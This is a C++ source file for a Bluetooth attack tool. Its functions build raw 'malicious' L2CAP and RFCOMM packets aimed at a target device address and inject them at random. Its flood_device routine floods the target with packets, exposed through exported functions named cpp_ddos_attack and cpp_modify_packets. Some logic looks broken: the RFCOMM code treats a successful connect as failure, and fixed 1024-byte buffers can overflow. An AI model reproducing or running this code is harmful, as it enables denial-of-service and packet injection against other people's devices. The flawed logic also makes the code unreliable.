#include "mal.hpp"
#include <sys/socket.h>
#include <unistd.h>
#include <cstring>
#include <random>

using namespace Bluetooth;

PacketManipulator::PacketManipulator() {
    ensure_hci_connection();
}

PacketManipulator::~PacketManipulator() {
    if (hci_sock >= 0) close(hci_sock);
}

void PacketManipulator::ensure_hci_connection() {
    hci_dev_id = hci_get_route(nullptr);
    if (hci_dev_id < 0) {
        throw std::runtime_error("No Bluetooth device available");
    }
    
    hci_sock = hci_open_dev(hci_dev_id);
    if (hci_sock < 0) {
        throw std::runtime_error("Failed to open HCI socket");
    }
}

void PacketManipulator::craft_malicious_l2cap(const bdaddr_t& target, const uint8_t* data, size_t len) {
    int sock = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
    if (sock < 0) throw std::runtime_error("L2CAP socket creation failed");
    struct {
        l2cap_hdr hdr;
        uint8_t payload[1024];
    } packet;
    packet.hdr.len = htons(len);
    packet.hdr.cid = htons(0x0001);
    memcpy(packet.payload, data, len);
    sockaddr_l2 addr = {};
    addr.l2_family = AF_BLUETOOTH;
    bacpy(&addr.l2_bdaddr, &target);
    addr.l2_psm = htobs(0x0001);
    sendto(sock, &packet, sizeof(l2cap_hdr) + len, 0, 
          (sockaddr*)&addr, sizeof(addr));
    close(sock);
}

void PacketManipulator::craft_malicious_rfcomm(const bdaddr_t& target, uint8_t channel, const uint8_t* data, size_t len) {
    int sock = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
    if (sock < 0) throw std::runtime_error("RFCOMM socket creation failed");

    sockaddr_rc addr = {};
    addr.rc_family = AF_BLUETOOTH;
    addr.rc_channel = channel;
    bacpy(&addr.rc_bdaddr, &target);

    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
        close(sock);
        throw std::runtime_error("RFCOMM connection failed");
    }
    uint8_t frame[1024];
    frame[0] = 0x03;
    frame[1] = 0xEF; 
    frame[2] = 0x03; 
    memcpy(&frame[3], data, len);

    write(sock, frame, len + 3);
    close(sock);
}

void PacketManipulator::inject_packet(const bdaddr_t& target, const std::vector<uint8_t>& payload) {
    try {
        static std::random_device rd;
        static std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 1);
        
        if (dis(gen)) {
            craft_malicious_l2cap(target, payload.data(), payload.size());
        } else {
            craft_malicious_rfcomm(target, 1, payload.data(), payload.size());
        }
    } catch (...) {
        ensure_hci_connection();
        throw;
    }
}

void PacketManipulator::flood_device(const bdaddr_t& target, int packets_per_sec, int duration_sec) {
    const auto start = std::chrono::steady_clock::now();
    const auto end = start + std::chrono::seconds(duration_sec);
    const auto interval = std::chrono::microseconds(1000000 / packets_per_sec);
    
    std::vector<uint8_t> dummy_packet(1024, 0xFF);
    
    while (std::chrono::steady_clock::now() < end) {
        try {
            inject_packet(target, dummy_packet);
            std::this_thread::sleep_for(interval);
        } catch (...) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            ensure_hci_connection();
        }
    }
}

extern "C" void cpp_modify_packets(const bdaddr_t* target_addr, const char* payload) {
    try {
        Bluetooth::PacketManipulator manip;
        manip.inject_packet(*target_addr, 
                          std::vector<uint8_t>(payload, payload + strlen(payload)));
    } catch (...) {}
}

extern "C" void cpp_ddos_attack(const bdaddr_t* target_addr, int duration_sec) {
    try {
        Bluetooth::PacketManipulator attacker;
        attacker.flood_device(*target_addr, 500, duration_sec);
    } catch (...) {}
}
